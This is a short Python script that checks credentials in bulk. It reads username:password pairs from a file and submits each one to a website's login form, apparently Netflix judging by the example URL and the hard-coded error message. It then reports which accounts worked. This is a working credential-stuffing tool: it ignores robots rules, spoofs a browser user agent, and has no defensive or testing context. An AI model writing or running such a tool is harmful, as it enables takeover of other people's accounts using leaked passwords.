import mechanize

br = mechanize.Browser()
#br.set_all_readonly(False)
br.set_handle_robots(False)
br.set_handle_refresh(False)
#br.set_debug_http(True)
br.addheaders = [('User-agent', 'Firefox')]

def setup():
	while True:
		info = raw_input("Enter the file name: ")
		if(info[len(info)-3:] != 'txt'):
			print('File name must end in .txt')
		else:
			break
	with open(info) as f:
		detailsList = f.read().splitlines()
	main(detailsList)

def main(detailsList):
	site = raw_input("What site do you want to test? ") #https://www.netflix.com/Login
	good = []
	bad = []
	for info in detailsList:
		username, password = info.split(':')
		loginPage = br.open(site)
		br.form = list(br.forms())[0]
		br["email"] = username
		br["password"] = password
		response = br.submit()
		if('The login information you entered does not match an account in our records. Remember, your email address is not case-sensitive, but passwords are.' in response.read()):
			bad.append(info)
		else:
			good.append(info)
	printDetails(good, bad)

def printDetails(good, bad):
	print('Out of ' + str(len(good) + len(bad)) + ' accounts, ' + str(len(good)) + ' of them worked! These accounts follow:\n')
	for account in good:
		print(account)
	seeBad = raw_input('\nDo you want to see the bad accounts? ')
	if(seeBad.lower() == 'yes' or seeBad.lower() == 'y'):
		print('\n')
		for account in bad:
			print(account)

if __name__ == '__main__':
	setup()